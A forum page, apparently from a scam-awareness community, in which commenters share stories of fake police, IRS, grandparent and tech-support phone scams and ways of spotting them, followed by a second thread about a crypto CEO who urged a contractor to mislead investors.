- > I asked to talk to her and he said no she was being detained and wasn't allowed to talk to anyone but he could send the link for me to pay for everything via walmarts website and she would be released and could call me herself.

Just want to say: even if you know someone who *would* do the things the "officer" described, I would determine its a scam based on the "pay for it on our website" part.

Walmart (or any other legitimate company) would not have spent money creating a website for this purpose. It would be difficult, take time and resources away from stuff that actually have value for them, and would not make back the cost for developing and hosting the site.

99% chance it would have just been a link to fake site using Walmart's logo, but I *am* curious about the 1% chance: if they had sent an actual Walmart link, how would they have gotten you to pay for the items? Send a link to a gift registry, and claim that's how they have it set up so you pay for them? Just an interesting thought.
- I had a similar situation that I knew was bogus and so I started to ask questions like, "Well what exactly did he steal? An iPad Pro? Is that the one with the new A10 chip in it? Yeah I heard there was a recall on it.. or something like that. Maybe it was just a software update. But that was CRRRRAAZY! Wasn't it? Speaking of which, I gotta run an update on mine. You know it seems like I gotta do a software update every other week. How long is it going to take them to get it right? I might end up going back to Android....."

And the guy was getting more frustrated by the minute because he kept trying to tell me to get a gift card and gave me instructions on where to go and what to say etc. LOL He eventually hung up because he figured out I was yanking his chain.
- I received a phone call from the IRS one evening  about my ‚Äúunpaid‚Äù taxes and imminent threat of jail unless I paid them immediately in iTunes gift cards (seriously!). The call originated in the Netherlands on top of it all. I told them I couldn‚Äôt get iTunes but would gladly pay in stroopwafels. They hung up.
- My husband got one asking for me.
He put on an old man voice and said
i'd passed away. The agent immediately said, oh I'm so sorry. My husband said me too. I didn't
mean to hit her that hard.

Click.
- Sorry about your loss. Hope that you figured out it was a scam right away regardless of the status of your mom.
- A similar scam call was made to my elderly and vulnerable (target demographic) aunt. The caller asked to speak to her husband, even though my uncle passed away in 2019.

My aunt began engaging with the caller, but another cousin intervened, took the phone and informed the scammer that her husband had passed away five years ago, included additional info and to not call back. It was super frustrating hearing his response. Oh... and they did call back.

NEVER volunteer information to these types of callers. They often use such details to create new, convincing stories for future attempts to scam
- Some scams might feel legit in the moment, but there is no legal version of a cop calling to demand payment in an official capacity, for anything.  That‚Äôs not how it works.
- My grandma (rip) got a scam call once from someone pretending to be my oldest cousin (Max, fake name). He was crying and saying something or other about being in trouble or his car having issues. Luckily my grandma was aware of these types of scams and asked, ‚ÄúMax, sweetie, where are you?‚Äù

Scammer: ‚ÄúWell, I‚Äôm in the same city as you, grandma.‚Äù

Grandma: ‚ÄúWhat city?‚Äù

Scammer: ‚Äú[insert city here]‚Äù

Grandma: ‚ÄúThis isn‚Äôt Max. He hasn‚Äôt lived in [city] for X years‚Äîhe‚Äôs stationed overseas with the Army!‚Äù

Dude quickly hung up, probably embarrassed lol
- Step 1. Never answer a call from a hidden number.
- A few years ago, I was getting calls from the same guy- different names, different phone numbers, different pitches. After 5or6 times, I finally said ‚Äúenough already, I recognize your voice‚Äù.  Haven‚Äôt heard from him since.
- All of you people answer calls?
- If law enforcement were on the ball, there could be a permanent solution to this: the ‚Äúpoisoned dollar‚Äù.

You, the law-abiding, scam-aware citizen, register with law enforcement for a service that, on demand, feeds you any of a dozen or so methods of payment: gift cards, western union, credit cards, crypto, etc.

When a scammer calls, you request the required payment method from the service. The info looks legitimate, but is traced by any payment system it passed through. You give the info to the scammer. It seems legitimate. Whoever tries to collect the ‚Äúpoisoned‚Äù payment is detained and charged.

This would take some changes to the world‚Äôs payment tech: just a little extra data attached to each payment and the cooperation of the networks. But it‚Äôs certainly possible.
- There are some weird scams going around. The other day I received a call from a ‚Äúdeputy‚Äù about a family member in jail. They used the name Patrick. They asked me, ‚ÄúAre you ______‚Äù and used my full name that I never use. I said, ‚ÄúNo, this is SpongeBob‚Äù. He got mad and said he doesn‚Äôt have time for my games üòÇ I told him that *I didn‚Äôt have time for HIS games, and hung up.
- When told that the police were on their way to arrest me, I told them that my sister was the chief of police (true). That cut the call quick.

Also, when trying to cancel cable, they try to get you to tell them why. I told them that I was dying and had been told to get my affairs in order. There's no canned response to that statement!
- I got repeated calls about my car‚Äôs expired extended warranty and needing to pay immediately to restore services. The only car I ever owned was a 1969 Toyota  Corona that went to salvage in 2008.
- Yes, all you have to do is pay for the items and the cops will release you.  Well known fact.
- A friend of mine got a call a virus in his computer, kept telling the caller he didn't have a computer  (which he didn't)  the guy finally said "are you sure you live in the United States? ".
- Sorry about your mom.
- My grandfather go the ‚Äúgrandson in trouble‚Äù call (he has only one grandson), and gave them $1700 before thinking to ask ‚Äúwhich‚Äù grandson was in trouble. That‚Äôs when he realized he was scammed.
- Just wanted to add that this can be a whole lot more convincing when they use the son or daughters voice with AI. My moms friend got scammed this way. Son was in jail trick but they actually let them talk to the son and he was crying and everything. The parents were convinced it was actually him. They can pull all the info they need from social media for the most part.
- Ours said she had a warrant that could go away if she paid, so I asked what it was about, and they said she was caught shoplifting yesterday.

This was like, four days after she died. 
"Really? Because I just saw her in a casket about an hour ago and she didn't look like she'd been anywhere very recently, but if she's there I suggest either Rick Grimes or a priest."
- They did this to my friend's grandma and she told them to go ahead and put him in jail, she was doing helping him.
- I am mostly getting medicare scams (I am not eligible to Medicare and get insurance through employer) - they don't go any further, but simply are annoying to respond, in case it is bank or something else important is calling. 

Other is backowed taxes to IRS. The most recent one was promissing to help with my debt - and got more desperate: loan? I don't have one. Credit card debt? I don't have any. Medical debt? Don't have any? Taxes to IRS? I overpay so I would get taxes back and don't owe them anything. The guy even repeated: you overpay?" He didn't have anything else to offer.

Car insurance stopped when I told that I sold a car and don't have any now. I did lie that no one else in household has one, but everything else was true...
- This scam is rampant in the form of the 'grandparent scam'.

If someone contacts you out of the blue and asks for money or personal information to help a family member, hang up and reach out to that family member directly. The scam will become clear immediately.

One thing I recommend for cases where scamming is more likely (susceptible parents, etc) is to set a family code word that can be used to verify the caller. Same way you protect a kid from an unauthorized pickup. If they don't say 'cantaloupe' when you say 'honeydew', then maybe that's not really your grandkid.
- I warned my grandfather about the scams calling for bail and ransom when I got him a smart phone. He replied that if he ever got such a call, he would tell them, "I don't know what you're talking about - I don't have any grandchildren."
- Lol. I love it.
- I want this scam call - Me ‚Äúnot again, I told her the next time I‚Äôd let her ass rot in jail.‚Äù
- The best thing to get into your elder relations' heads is that if they don't know the number, let it go to voicemail.  DO NOT PICK UP.  If it's actually an important call from an unknown number, the person calling will leave a message and/or call back several times.  Someone in jail will ABSOLUTELY leave a voicemail.  The real police or LEOs will leave a message.  

The thing with scams these days is that MOST of them are using a program that masks the real calling number with a fake number: but as of right now, those programs almost never use the same fake number twice in a row.  But even if they do, a real person is going to leave a message at some point, since they should realize that people don't tend to pick up unknown numbers anymore, and that most carriers have software that can pick up indications that the real phone number is being masked.
- I git a call from the IRS and sent it to voice-mail. Voice-mail came in with "Pay your taxes now and we will not send the police. They have a warrant for you and are waiting." I called back because I knew it was a scam and I wanted to fuck with them. Low and behold I learned that day that the IRS uses Magic Jack for a phone service and the message box was full, and my call could not be completed as dialed.
- When I have time I try to engage them for while.  Then I tell them my battery is low can they call me back on land line.  Then I give the phone number for either the sheriff or the fbi
- Lock her up!
- Imagine if this scammer called someone who was estranged from their parents.
- I'd say to go ahead and jail her.
- Maybe they found older arrest records of your mom?
- If I ever get a call and it's some one with an Indian accent I hang up. Or anything with credit cards, banks, anyone saying they are an officer etc. Mainly if Im not expecting a call or it shows up as unknown or not saved I don't answer the phone.
- When you get calls like this and the person is clearly Indian, I always say I didn't know Dalits were allowed to use the phone. They go absolutely mental.
- I got a call from the IRS, like wtf, lol, saying that they found my car packed with lots of coke‚Ä¶in Florida, so if I didn‚Äôt pay 500 dollars in the form of a target gift card asap, the police will come and arrest me. I told them at they can have my car and that I‚Äôm waitjng by the front door for the cops‚Ä¶I was called every name in the book after that responce. 

What idiots!

Edit‚Ä¶lol, COKE! Hehe
- r/traumatizethemback
- I‚Äôve tried but never got past 30 minutes.  As I pretend to be looking for stuff on my computer I ask about their family.

When they start losing their patience I suggest they have their same sex sibling do something for them to take the edge off.  And ask them for their junk pictures.  They seem quite offended when I call them a ‚Äúmommas girl‚Äù or ‚Äúdaddy‚Äôs little fella‚Äù.

I‚Äôm never rude, use precise diction.  For some reason they don‚Äôt like being asked if they fornicate like dogs breeding‚Ä¶.
- My in laws got a call from an alleged border guard that my wife and a friend were picked up on the other side of the country for running drugs. 

Funny though, I‚Äôd just dropped her off at her job at the bank, so unless she had a supersonic Dassault Falcon I don‚Äôt know about at the back of the tiny bank‚Ä¶

I told my in laws to ask for a cut of the money next time üòÜ
- Some hopeful scammer once called me and said I hadn't paid my Eversource bill, so they were going to cut off my electricity unless I paid immediately.

Unfortunately for him, my area is served by United Illuminating!
- I kept a scammer on the line out of sheer spite that insisted my car warranty had expired. The registration was out of date, etc

 Finally I got bored and admitted I only ever owned a bicycle lol fast *CLICK*
- My Dad got one of those a few years ago claiming that his grandson had been arrested and was in jail and needed to be bailed out. 

My dad's reply was perfect, he said grandson? God damn it he didn't tell me they popped out another kid! 

Then he went on a rant about how they can sit in jail because he's tired of supporting my lazy ass and that my boyfriend needs to get a job!

Surprisingly they hung up ü§£ü§£
- I watch a lot of police bodycam videos, and a common topic is the arrest of shoplifters at Walmart or Target.  Many people, once they have been caught, offer to pay for the items they stole in order to avoid arrest, prosecution,  and being banned from the store.  I have never seen the store or the police agree to this.  If the dollar amount is small and it's the person's first offense, the store will sometimes agree to take back the stolen items and ban the person (which means if you come back on the premises you will be arrested for trespassing), but I have never seen them let the person pay for the stolen items and walk away with no consequences.
- 'Semi believable....' like for a moment you kept an open mind
- My brother likes to have fun with these types of calls and plays along. He is very good at it.  I watched him keep one on the phone for over an hour one time.  He pretended to cry and everything.  I've tried it a few times but I only lasted for 15-20 minutes.  The point is to hold them up for as long as possible while leaving them feeling completely deflated when they find out you were pranking them all along.  

It's good clean fun and perfect revenge without hurting anyone.
- Have you guys watched The Bee Keeper? Wasn‚Äôt a great movie but I really enjoyed watching scammers get slaughtered.
- My mom got a call saying her grandson was in jail, jokes on them, she doesn't have any grandchildren

- Never ever answer hidden # calls lol. And if you, don't trust them.
- When we had a landline, we would get these calls 10 to 15 times a day. Well we‚Äôd answer the phone. The first time we would hear would be bloop. That was our key to know it was a scammer. So we said bloop hello and they‚Äôd start in on theirspiel. We would reply bloop no, we don‚Äôt have that or bloop. We‚Äôre not interested, but we‚Äôd start every single reply with a bloop. After a while, they‚Äôd get frustrated and hang up.
- I got a call from the IRS and they were going to arrest me and freeze all my accounts. I pretended to be freaked out  and asked stupid questions and played dumb when they asked me to do stuff. I kept saying Google card instead of Apple Card and he kept correcting me trying to stay polite. 

Then at the end, he told me that the police were coming to arrest me. ( I live on a reservation. Rez cops aren‚Äôt coming for that $h!¬•.) I then said That‚Äôs funny that they are going to arrest me because my husband is a policeman. 

They hung up. Took 35 minutes of his life he will never get back.
- Well, that was a very rude Police person! Perhaps you should report them to the Chief of Police and the Manager at Walmart.
- Well you got the best of him obviously, but I would have suggested traveling there to interact with her and the "police".
- My aunts mother had that happen about one of my cousins being in an accident and in jail or something.  It's insane how widespread these scams are.
- Sadly my elderly neighbor fell for it, $15,000.
- I kept getting calls for solar panels, about once a day for months. Anyone who started off with ‚Äúhello, how are you today, is this <<my name>>?‚Äù I would just ask ‚Äúis this call about solar energy?‚Äù and every time they would say yes. I would immediately say ‚Äúgoodbye‚Äù and hang up. I kept getting calls. One day I just decided to be slightly belligerent; after being told it was about solar energy, I asked ‚Äúwell why should I invest in solar energy when the sun‚Äôs just going to explode in five billion years?‚Äù 
‚ÄúDo you really think we‚Äôre going to live that long?‚Äù 
‚ÄúWell they‚Äôre constantly making medical advances.‚Äù
‚ÄúThat‚Äôs the dumbest thing I‚Äôve ever heard.‚Äù
‚ÄúWell BRABRABRABRABRABRAH to you.‚Äù
They hung up.
It‚Äôs been three months and I haven‚Äôt received a single call for solar energy since.

- This is so awful. Scammers really don‚Äôt care how much they hurt people. üò°

 I‚Äôm glad you caught on, but it‚Äôs sad to think about others who might believe them. Always be careful with calls like this‚Äîif something feels wrong, it probably is.

- My MIL, in her 80s, got a call from her "granddaughter" who had been arrested and needed Grandma to pay to bail her out. My MIL gave the arresting officer her credit card info.
All scam of course. Fortunately she gave them the numbers off her debit card that had a $300 limit. They tried for $2000 six times.
MIL later said, when we were exposing the scam to her, that she had wondered why her granddaughter called her "Grandma" instead of the name all grandmothers in our family are called.
Mil's cards were taken away and she has no role in her finances anymore.
- My parents got a call about my cousin. He had gotten arrested for whatever bullshit reason. Sure.

These nimrods actually put someone on the phone, pretending it was my cousin. I don't understand why they even tried that. The detained thing makes at least a little sense, but they weren't that smart. My parents just kept hanging up everytime they called back.
- [removed]
- Ngl you had me in the first half. Wow
- Oh damn, OP!  I wish I could upvote you a thousand times for that.
- Should have left him hanging. "I've got to transfer some funds. I'll call you back in two hours."
- I‚Äôve gotten a couple of those calls. I always say ‚ÄúOh she‚Äôs been arrested good, I‚Äôm tired of her coming home with stolen stuff all the time. It used to be not as bad when she was stealing good shit, but lately she‚Äôs been stealing all this cheap ass shit they push on the shopping channels. Maybe if she doesn‚Äôt get bailed out for a week she‚Äôll cut this bullshit out‚Äù. Then I hang up.  I think I‚Äôm off the ‚Äòsucker‚Äô lists now as it‚Äôs been a few months since I last got one of those calls.
- 1st they contacted you, you or someone you know didn‚Äôt initiate the conversation.
2nd the first thing they do is need money.
3rd there is some form of unverifiable pressure.  Arrest, data leak, etc.
Scam, scam, scam.
- [removed]
- I'm getting an awful lot of scam calls.  My question is, where do they think I'm located.

This is how I know if it's a scam or not.
- My boyfriend's grandma got a call that he got in an accident and was arrested. She calls his Dad, who then calls me (we live together), but it was figured out really quickly because he was stationed in Japan at the time. I still tried to call him, it was night his time, but I got ahold of one of his navy buddies and said all was good.

- Fake scam. Police will never ever call
- Omg there is a dharmann video on YouTube with the same concept
- Why are people still answering numbers they don't know?
- We got calls about ‚Äúour windows computer‚Äù that even in the late 90‚Äôs, we always had Macs. My mom was fond of responding ‚Äúwe don‚Äôt have windows, we have doors‚Äù
- [removed]
- Ive gotten the text that "mom, my phone is broken and i need money to get a new one"

I hv never given birth and nobody calls me mom.
- My husband‚Äôs grandpa once got a call that my husband (his grandson) was in jail and needed to be bailed out. He didn‚Äôt pay. Grandpa then called me to let me know my husband was in jail and needed to be bailed out. We‚Äôre sitting in the living room together at the time.
- My grandma got a call saying I was arrested in California, a state, at the time, I'd never been to, and that she needed to pay $2000 to bail me out. Fortunately, she called me first to verify, at which point I was like, Grandma, I love you, but I'm married and both my parents are alive, don't you think I would have called them first, especially since I know their numbers and not yours.
- My MIL from her "granddaughter": Oh, that sounds terrible. You'd better call you father right away!"
- I got that call. He said he was in trouble. He called me grandma so I made my voice a little shakey. I asked if he was in jail. He said yes grandma. I said good I hope you rot there. Grown ass man calling me grandma when I wasn‚Äôt old enough to be a grandma pissed me off.
- I love when "Microsoft support" calls. I play along until they tell me to type in "XYZ" in regedit and then hit any key. I tell them I can't find the "any key". It takes a while but they usually get very frustrated before they get angry and hang up.
- Yay Mom
- My mom got that same call years ago.  I was so thrilled that the person they had impersonating my son didn‚Äôt sound enough like him and she hung up.
- I've allowed "Microsoft Support" to connect to a VM I set up.

They didn't like the Goatse wallpaper.
- I had a scam caller pretend to transfer me to a manager and picked the phone up 2 rings later with the exact same voice and different name and got upset and hung up when I called him out on it.
- LOL, my mom got this call too from a grown man claiming to be my six year old nephew.
- Love it. Nice simple, effective tactics from your mum. 

I'm sure multiple people have tried to scam both my parents, but they have this healthy suspicion of anything unfamiliar that comes their way and it seems to keep them safe. 

One day my mother received a call from someone claiming to be from their bank. The caller identified her by name and said there'd been some suspicious transactions in her account. My mother called bullshit. The caller insisted that the transactions had happened but the bank had stopped them, and as a precaution they were cancelling her debit card and sending out a new one. My mother again expressed disbelief and hung up. 

A couple of days later she received a new debit card in the mail and said "Oh, whoops. I guess they really were from the bank."
- My mom got a call that her grandson was in jail. She asked which one and he said Mark. Luckily, she knew Mark was in Germany at the time. She hung up on him.
- Thieve two happened to my mom. With the Microsoft one she got all the way to the bank to withdraw tens of thousands of dollars but had forgotten her I‚Äôd. In that space of time my sister heard and was able to intercept her.
- My husband‚Äôs grandmother fell for the grandson in jail scam - and the grandson‚Äôs name they used? ¬†He‚Äôs a cop and she really believed he called HER (practically non-existent grandparent) not his own parents or a lawyer for bail money.
- when I still had a land line I had someone call claiming viruses in my computer and I told them I built my pc so I knew what I was doing. They hung up.
- I got that call from Microsoft about viruses on my computer. After going back and forth I asked them what was my IP because I knew they were scammers. Of course they couldn't answer. They finally said "Have a nice day, ma'am" and hung up.
- The last call I got from Microsoft support ended so quickly when I responded, "On my Macbook?"
- Have you seen the movie ‚ÄúThelma‚Äù?
- I had the PCH sweepstakes call and the next day the SSN scam. It was the same guy lol !
- Your mom is awesome. :-)
- I had a similar call.   I asked if they‚Äôd had a seance, but the goober on the phone apparently wasn‚Äôt familiar with the term.  He hung up after I guess he got tired of my laughter.
- "Let me ask you, did you hear harps in the background, or the wails of the damned?"
- So that's where the office's ouija board went...
- I got a similar call and said I‚Äôll ask him next time I‚Äôm visiting his grave. They hung up on me‚Ä¶the nerve! üòÜ
- he was just really slow about returning his calls probably
- It wasn't a scam, but the day my dad died, Mom got a call from someone wanting to sell Dad life insurance. Mom told them they were too late.
- I'd be worried if he said it was from a "Hotline"
- This is what I'd say if I got one of those calls.

I don't have any children.
- Reminds me of the newscaster who answered while in her living room but started talking like she was live reporting about scams and they had the police on the line tracing it. Mofo hung up real quick lol.
- This is good, I have to remember this
- I had the ‚Äúpolice‚Äù call me as well. They said there was a warrant out for my arrest but I could get a rid of it if I pay them in gift cards. Funny thing is that I‚Äôm a police dispatcher lol. Got tired of the call and hung up on the guy. He called me back to cuss me out!! ü§£ü§£
- [removed]
- Given that the ostensible location was a Walmart, if the mark takes the bait the transfer method would probably be purchase of Walmart gift cards in the amount of the total that was "shoplifted."
- My late wife got a call about Medicare-covered genetic testing (not!).  I asked if they needed blood samples or a mouth swab would work.  They didn‚Äôt know the answer to that, so I told them if they could send a nurse out to collect the samples, I would meet them at the cemetary where she has been for the last 2 1/2 years.  Alas, they hung up so we will never know what diseases she may be subject to in the future.  I‚Äôm not an MD, but my informed prognosis is‚Ä¶ none.
- And a shovel
- My grandfather‚Äôs reaction to every telemarketer was, oh I‚Äôm sorry you want to speak to mr horn.  Then grab the air horn he kept by the phone and honk it into the receiver.  He didn‚Äôt get a lot of repeat calls.
- I like to say, ‚ÄúI‚Äôm sorry, I don‚Äôt speak English‚Äù (in perfect English). Usually confuses them into apologizing and hanging up.
- My mom told me how she convinced them she‚Äôs a poor senior and they reduced their price for $60. Yay mom. And I had to fix her computer after that.
- Did that as a teenager
- probably buy gift cards and read the numbers over the phone. I watch enough shoplifting videos on YT, the perps usually say "I can pay for it" in an effort to get released, it never works. It's not like a Uno reverse card. Pay if you get caught.
- Hi, not American here. Surely Walmart has some sort of online ordering website, right? I mean a legitimate one?

Scammer could get the victim to pay for a real order, which would then be picked up by the scammer.
- >It would be difficult, take time and resources away from stuff that actually have value for them, and would not make back the cost for developing and hosting the site.  

This isn't all that accurate. A lot of the code could be lifted from the main e-comm site itself and hosting would be basically free, since they already have their main site. Whether self-hosted or otherwise, a secondary site like this would add nothing to the hosting bill.  

In the imaginary world where this is how Walmart handles shoplifting, it could make sense to run a secondary site for this sort of purpose, since it could be implemented a lot more easily than the main e-comm site.
- Wait. You mean Queen Elizabeth DIDN'T need me to pay my British taxes (I'm American, and have never been to England or worked for an English company) with Walmart and Starbucks gift cards? She said she was going to tell the tax people on me! Also, for the ruling monarch, her spelling and grammar left a lot to be desired.
- Yep, don‚Äôt engage at all, just hang up. Or yell obscenities and hang up. I tell people if they still have the old fashioned phone, slam it down into the cradle.
- These days I don‚Äôt answer half the calls coming from people in my contacts let alone unknowns lol.
- Unfortunately, I have had a real call from the cops from a hidden number concerning my mom. 

It's a long story involving lewy bodies dementia, the police and the belief that a character from a major crime drama had moved into my mom's attic and was playing Christmas music all night.

Just have situational awareness.
- It's been spoofed numbers in my experience. A new number almost every time.
- The fact some of you people pick up for unknown numbers AT ALL is crazy
- I love this. The stories are fun to read, but rarely do you hear any solution that is actually plausible. The problem would still be LE resources (in terms of bodies and time), but eventually, this would indeed weed it out... and also might serve as an ACTUAL deterrent that they feared.
- My son kept getting that one a couple of years ago. He was 11 so definitely no car, and the newest car the family had was a 2007. He thought it was hilarious.

- It's a real scam, not a fake scam.
- You didn't read to the end, did you?
- So that this sub has content. You're welcome.
- I remember years ago walking in the mall with my dad when he got a call. I couldn't hear the guy but he was walking my dad through menus on a windows system. my dad works IT and could navigate that window by pure memory (but like you we only had mac rigs, so we knew it was crap), so dude's asking him what he sees and dad's describing the options, while we're just walking passed stores. had the guy going for like 20 minutes before he figured it out, but only because he heard something around us that gave away that we weren't at home.

the kicker tho is when he realized it, he didn't just hang up, he was mad at all that wasted time, but STILL tried to push it. dad let him be as mad as he wanted tho, it just meant he could waste even more of their time arguing over it lmao
- I had a coworker who would get these calls and drag it out as much as possible then finally say, "The apple is on the screen. Now what?" \*click\*

- I call my mother "ma" and neither of us can remember the last time I called her "mom" so she'd just mark that text as spam and forget about it.
- My grandmother got a call from my "brother" purporting to be in jail because he tried to break a fight up.

Grandma said if he was in jail for fighting, he deserved to be there and hung up.
- Grandma was ready to shell out, though! You should send her some flowers
- Same happened to my grandma, except Mexico. She just handed everything to the scammer too.

"Hey grandma, it's me, your grandson."
"Oh, Cleric_Guardian?"


"Yup, it's Cleric_Guardian."
"You sound so different though. Are you sick?"

"Yup, that's right, I sound different because I'm sick."

Nearly got her to send the money before the clerk wherever she went stopped her. They said to try calling my actual phone number (came in from a weird number, because I was in booking obviously). I answered, not sick, but very confused and very much not arrested in Mexico.
- My mom got a call from a "grandson." Her only grandkid at the time was a 2 year old girl.
- I tell them my keyboard is broken and the windows key is missing, and ask them to give me a workaround. It‚Äôs fun having them try to go off script because they don‚Äôt know what to say
- Yeah just play dumb like you are trying to do what they are asking but can't figure out how to work those confounding computers, until they lose their cool or give up, if you have the time.
- That is what is scary about some of the technology coming onto market now, they can mimic a voice convincingly with a good sample of that voice.  They can mimic a video for that matter too.  If possible one wants to actually talk to them and ask them a question only they would know.
- I fucking love you for that.
- I too once to suspicious of a call from the bank about my credit card.  I got a bit sarcastic with the caller.  But it was actually legit.
- I found out years later that my grandad lost almost 3k with that scam. He apparently didn‚Äôt want to bother my husband by having him work on their computer again. He was embarrassed and didn‚Äôt tell my mom it happened until a year or 2 after. I hate those scams that prey on the elderly.

- My elderly parents get Medicare scam calls sometimes. It's fun how long it takes them to realize they called the wrong country.
- ü§£ü§£ü§£ü§£
- Bless her heart!
- Like people in customs who declare they have nothing and when the agent finds food in their bag, they're like, "Sorry, I'll check yes then." That's not how any of this works.
- Yes, they definitely could. But most scammers are after money of some sort, not getting their weekly groceries delivered.
- Give her a break, corpses probably aren‚Äôt the best with spelling and grammar, it‚Äôs difficult enough as a living person!
- I really miss having a landline. The act of putting an exclamation point at the end of an angry rant by slamming the phone down - well, it was just so satisfying. Now we‚Äôre limited to pushing the red end-call screen icon really hard.
- I just screen all my calls from unknown numbers. The scammers always hang up before I answer, whereas legit callers tell me why they're calling.
- True.  They used my own number once, many years ago.
- I know people who just do it to mess with the scammers. Having an aggressively autistic family that has half a dozen special interests on hand at any given moment‚Ä¶ They can talk nonstop for HOURS. It‚Äôs hilarious to see how long it lasts, I think the longest one was a moth ramble that lasted probably 15-20 minutes before they got tired of her talking
- I think it would- and it‚Äôs not difficult to implement. There are already many regulations about reporting transactions to central authorities for law enforcement purposes.

My idea is that the would-be ‚Äúvictim‚Äù creates a new case online where they capture any evidence they can. The payment they get has that case ID attached to it, and each time that money changes hands it sends trace data back to the authorities.

The tag is ‚Äúcontagious‚Äù. If you accept poisoned funds into an account, all funds in the account are now poisoned.

If the money crosses a political boundary - international payments - it‚Äôs referred to LE in that country and we expect the same follow-up we would in this country. Failure to comply subjects the recipient country to sanctions.

Finally, you train local law enforcement in how to respond and have a ‚Äútiger team‚Äù approach. No matter how many transactions someone attempts, there always has to be a point where the ill-gotten gains are withdrawn.

I‚Äôve had a family member experience this: they got a call from their bank that a person was attempting to cash a check on their account with a duplicate check number. The bank stalled the criminal while the police were called.

Once word gets out that scammers are going to prison, this will stop pretty quickly.

Title: Curious what you think this was
Body: I was hired by a crypto ceo (who did have legit ties to big people in crypto, but he was fundraising his newest business, he was constantly Lying about how much money he had raised and how close to closing all these investors he was. He told me he was close to raising $100m when I met him (this is believeable bc of the people he works with ‚Äî no idea why they associate with him after this). Long story story, not of the deals he was talking about were real, then he wanted me to contact investors and say xyz (lies) to my own business contacts. I said no bc it is fraud ‚Äî I work investing. I told him since I was not a full time employee is is illegal for me to fundraise bc i am not a stockbrocker. So there he hired this company which was an ‚ÄúAl: investment company. I almost think he put together as scam also, bc there was only 1 person on linked, with 500 employees worldwide? Of course this guy told me wanted me to work on a ‚Äúsuccess fee‚Äù. So i scam the investors, he takes off with their money and I go to jail and he doesnt pay me? It that it. IDK.

- Oh my sweet summer child.
- A crypto bro lying?  Tell me it isn't so.

What is it you were hired to do?  What is it you want readers to learn from this post?
- You‚Äôre in so deep you‚Äôre refusing to believe that you‚Äôre being taken for a fool.
- When you say "met" do you mean in person, or online?
- As soon as you see the word Crypto assume its a scam. Just stop contacting them.
- Whatever he told you is all lies. The UN doesn't get into investing, so that's a big red flag. In addition to the other red flags you saw.

What hes trying to do is almost certainly illegal in the US, report him to the SEC or FINRA.

I really doubt that he is a big investor, that's what he told you, but he is lying. Maybe he impersonated a real investor -- this kind of scam has been reported here.

Did he contact you online, through WhatsApp or Telegram or social media? That's usually how these schemes and scams start.
- Crypto is inherently a scam. It's money without government backing: pure speculation, pure pyramid/confidence scheme. None of it is regulated, none of it is legit. 

Everything about this reeks, and you shouldn't touch it with a barge pole.
- Yeah. But this guy has tied to the UN. Like legit ties who are verified, this wasnt exactly crypto, it was like tokenized equity. Anyway, he was trying to get me to get investors involved. I wass like "not without an official UN press release saying rhey are affliated etc" and it was like oh next week it comes out next week. Finally i was just like no -- i dont tbink it ever came out but im not sure what exactly he wanted from me. Like my contacts or if he wanted me to invest. He told me to do so kuch shit was i was like ehm no that is fraud. And lying to huge people that would make me look like a fraud too. Maybe he was just stupid and playing his hand or trying to set me up -- not sure which one.
- Im like ehhh no bc we didnt and they would probably report me -- was like he was trying to set me up or he is just stupid and ok for me to take the fall if he got in troubke
- I was hired to work in fund raising for this company but he was asking me to do shady ass shit "messaged all your linkedin contacts and tell them ae just closed $100m -- i did"
- No im. Not deep -- i left this dude and blcoked him. I mever gave him anythijg ot told anyone aboht his company. I am more asking what yhr point of thre scam was -- to scam me or get me to scam people or set me up? Idk
- No i KNOW this guy, in person, this was a work situation. I work in finance/tech in NYC. I know other people who know him and were introed by them, I know people who he has worked with -- now i am wondering if it is a bigger scam or something.
- Well i work in tech -- some crypto is legit but smaller ones are usually pump and dump schemes etx. Learned that kore recently theough this that lost of it is shady
- this wasnt exactly ‚ÄúCrypto‚Äù it was tokenized equity in rain forrests etc and it is a ongoing venture for companies to invest into ESG initiatives (This isnt the only company doing this for reforrestation etc) Other people involved in the BOD are people with ties to the UN and they did present it at two UN COP climate change conferences, which is why it is shocking that apparently it was/is a scam. I said ‚Äî I am not willing to tell anyone I know about the project or tie my name to it since I work in a tech investing role unless there is an OFFICIAL letter that the UN is involved in the projects and it is involved with their Net-Zero initiative. If there is no Press Release - bye. Obviously, there was never a PR and to this day there don‚Äôt say anything on their website., either. I don‚Äôt even thing this is a ‚Äúbeing overly optimistic‚Äù I think it is a straight up scam. But to go to UN conferences and present and post it on linkedin and then get other people to repost it also. The whole thing is fucking WEIRD.
- I am no longer involved ‚Äî I got out, but my question was what the point of it was. Like maybe he thought I was going to invest. I am not sure. The whole thing was weird, but mostly that he is connected to legit people, which makes me believe there are more people involved in this scam. It was very orchestrated.
- Ok, crypto, ties to the UN... Nah.
- What have you been doing for work up to now and how did he find you?
- Money. Your money in his wallet. That's the point of most scams: to take your money.
- >he was fundraising his newest business,

And what product did this new business produce and sell? What service did it provide? What contribution to the economy or society did it offer?
- No but i actualy know thr UN people he is tied to -- im just not sure why they would associate with someone like this. I assume they must do some moneh laundrring on the DL. Kinda weird.
- It was an investment into substainable reforrestation ‚Äî so it wasn‚Äôt exactly crypto, but it was tokenized equity on a blockchain, but he has a crypto background. This guy has ties to the United Nations (and I am not just saying bc he told me, bc I KNOW (Like actually KNOW) the people he is tied to who work with the UN. So the idea was this was a project being backed by the UN as a part of net zero decarbonization initiatives. There were several investment bankers involved, who are certified financial analysts \*again people who are publicly tied to the UN. I said I would work on it, but only if there people 1) are publicly openly tied to the project (it says it on the website and they like the posts for the company and I have seen pics of these people with the CEO Presenting this project at 2 UN conferences) and 2) there is a press release from the UN that they are part of this project (ie i am not gonna just take his word for it and tell people the UN is involved). Neither of the above materialized in 6 weeks, which is when i said see ya.

I am confused as to how this is a scam ‚Äî unless a lot of people are involved in it, or they don‚Äôt know he is using their name as part of a scam. I am not totally stupid ‚Äî this isnt someone who messaged me on reddit or something. I know these people in person through work contacts, I work in tech. I was lucky that I recognized it was a scam, bc it was through personal contacts, he has more credibility and he probably thought I would take his word for it. However, I am aware of the US investment laws and I am not willing to take his word for it and promote a project to investors which I am not sure is 100% legit. Like its a possible scam or money laundering, etc. I also found a thread that he was accused of running a ponzi scheme previously, which is also why I am SO confused that these big UN Investment bankers would be connected to him publicly.
- Well, all I can say is, don't spend money to make money, no matter what you believe about this group.
- What crypto CEO are you talking to?
- So why come here?
- What would crypto have to do with a multinational nonprofit net zero program? 

I'm sure there is a project that has been reviewed and certified by the UN. But since he has not been able to show any actual ties to the project, he's just using it as a front for his bogus "fundraising." The fact that he's trying to "fundraise" via crypto is an obvious red flag.
